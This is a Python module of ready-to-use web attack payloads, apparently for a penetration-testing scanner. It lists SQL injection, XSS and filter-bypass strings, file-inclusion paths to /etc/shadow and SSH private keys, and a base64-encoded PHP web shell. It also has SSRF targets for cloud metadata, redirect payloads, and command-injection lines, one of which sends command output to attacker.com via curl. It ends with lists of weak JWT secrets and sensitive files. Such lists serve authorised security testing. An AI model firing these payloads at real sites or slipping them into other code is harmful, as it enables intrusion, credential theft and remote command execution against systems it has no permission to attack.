"""
Web Exploitation Payloads
"""

SQLI_PAYLOADS = {
    "auth_bypass": [
        "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#",
        "admin'--", "admin'#", "' OR 1=1--", "' OR 1=1#",
        "') OR ('1'='1", "' OR 'x'='x",
    ],
    "union": [
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT 1,2,3--",
        "' UNION SELECT @@version--", "' UNION SELECT user()--",
        "' UNION SELECT database()--",
    ],
    "error_based": [
        "' AND 1=CONVERT(int, @@version)--",
        "' AND extractvalue(1, concat(0x7e, version()))--",
        "' AND updatexml(1, concat(0x7e, version()), 1)--",
    ],
    "time_based": [
        "' AND SLEEP(5)--", "' AND SLEEP(5)#",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND 1=(SELECT 1 FROM PG_SLEEP(5))--",
    ],
    "boolean_based": [
        "' AND 1=1--", "' AND 1=2--", "' AND 'a'='a", "' AND 'a'='b",
    ],
}

SQLI_ERRORS = [
    "SQL syntax", "mysql_fetch", "mysqli", "ORA-",
    "PostgreSQL", "pg_query", "SQLite", "sqlite_",
    "Microsoft OLE DB", "ODBC Driver", "Incorrect syntax near",
    "You have an error in your SQL syntax", "Warning: mysql_",
]

XSS_PAYLOADS = {
    "basic": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ],
    "filter_bypass": [
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<script>alert`1`</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=x onerror=alert`1`>",
        "<svg/onload=alert(1)>",
    ],
}

LFI_PAYLOADS = [
    "/etc/passwd", "/etc/shadow", "/etc/hosts",
    "/proc/self/environ", "/proc/self/cmdline",
    "/var/log/apache2/access.log", "/var/log/nginx/access.log",
    "/root/.bash_history", "/root/.ssh/id_rsa",
    "C:\\Windows\\win.ini", "C:\\boot.ini",
    "../../../../etc/passwd", "../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1", "http://localhost", "http://0.0.0.0",
    "http://[::1]", "http://0177.0.0.1", "http://2130706433",
    "http://0x7f000001", "http://127.1",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "file:///etc/passwd", "file:///c:/windows/win.ini",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:6379/INFO",
]

OPEN_REDIRECT_PAYLOADS = [
    "//attacker.com", "https://attacker.com", "http://attacker.com",
    "///attacker.com", "/\\attacker.com", "\\/attacker.com",
    "https:attacker.com", "https://attacker.com@target.com",
    "javascript:alert(1)",
]

COMMAND_INJECTION_PAYLOADS = [
    "; id", "| id", "|| id", "& id", "&& id",
    "`id`", "$(id)", "%0aid", "\\nid",
    "; sleep 5", "| sleep 5", "& sleep 5",
    "; curl http://attacker.com/$(id)",
    ";$IFS$9id", ";/???/i?", ";cat${IFS}/etc/passwd",
]

JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "admin", "key", "jwt",
    "changeme", "default", "test", "qwerty", "letmein",
    "secretkey", "mysecret", "jwtsecret", "supersecret",
]

SENSITIVE_FILES = [
    ".git/config", ".git/HEAD", ".gitignore",
    ".env", ".env.local", ".env.production",
    ".htaccess", ".htpasswd",
    "config.php", "config.js", "config.json",
    "wp-config.php", "settings.php",
    "backup.zip", "backup.tar.gz", "backup.sql",
    "database.sql", "dump.sql", "db.sql",
    "phpinfo.php", "info.php", "test.php",
    "admin.php", "login.php", "upload.php",
    "robots.txt", "sitemap.xml",
    "web.config", "composer.json", "package.json",
    "Dockerfile", "docker-compose.yml",
    "README.md", "CHANGELOG.md",
    ".DS_Store", "Thumbs.db",
    "id_rsa", "id_rsa.pub", "authorized_keys",
    ".bash_history", ".ssh/config", ".aws/credentials",
]

COMMON_API_ENDPOINTS = [
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/api/users", "/api/user", "/api/admin",
    "/api/login", "/api/register", "/api/auth",
    "/api/config", "/api/settings", "/api/health",
    "/api/status", "/api/version", "/api/docs",
    "/api/swagger", "/api/swagger.json", "/api/openapi.json",
    "/graphql", "/graphiql",
    "/v1", "/v2", "/v3",
    "/admin", "/admin/api", "/admin/login",
    "/user", "/users", "/profile", "/me",
    "/auth", "/login", "/register", "/signup",
    "/token", "/oauth", "/oauth/token",
    "/.well-known/openid-configuration",
    "/.well-known/jwks.json",
]

SECURITY_HEADERS = [
    "Strict-Transport-Security",
    "Content-Security-Policy",
    "X-Content-Type-Options",
    "X-Frame-Options",
    "X-XSS-Protection",
    "Referrer-Policy",
    "Permissions-Policy",
    "Access-Control-Allow-Origin",
]

GRAPHQL_INTROSPECTION = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      kind
      name
      fields(includeDeprecated: true) {
        name
        type { kind name }
      }
    }
  }
}
"""
